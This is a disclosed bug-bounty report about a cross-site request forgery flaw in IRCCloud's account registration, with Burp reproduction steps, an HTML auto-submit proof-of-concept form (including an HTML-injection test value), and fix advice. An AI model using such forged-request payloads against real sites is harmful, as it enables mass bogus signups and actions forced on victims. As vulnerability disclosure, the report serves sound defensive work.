---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7332'
original_report_id: '7332'
title: CSRF - Creating accounts
weakness: Cross-Site Request Forgery (CSRF)
team_handle: irccloud
created_at: '2014-04-12T14:49:58.999Z'
disclosed_at: '2014-05-14T17:16:31.802Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF - Creating accounts

## Metadata

- HackerOne Report ID: 7332
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: irccloud
- Disclosed At: 2014-05-14T17:16:31.802Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi there,

I've discovered the following CSRF issue: There's no CSRF / Bot protection on the registration form. 

###Details

An attacker could automate the registration process to flood your database with invalid/useless accounts. He could also source the process out to his victims (CSRF).

###Steps to reproduce
- 1. Go to https://www.irccloud.com/
- 2 . Turn on burp and submit the registration form
- 3. Remove the "token" and "_reqid" parameter from the request body and forward it
- 4. The account should be created succesfully.

CSRF PoC:

```
<html>
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="tes3&#64;internetwache&#46;org" />
      <input type="hidden" name="password" value="fooobar" />
      <input type="hidden" name="realname" value="test&quot;&gt;&lt;h1&gt;foobar&lt;&#47;h1&gt;" />
      <input type="hidden" name="invite" value="" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

###How to fix?
Either validate the "token" parameter server side or use a CAPTCHA to fight bots. The latter would be the prefered fix in my opinion. 

Yours sincerely,
Sebastian Neef

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
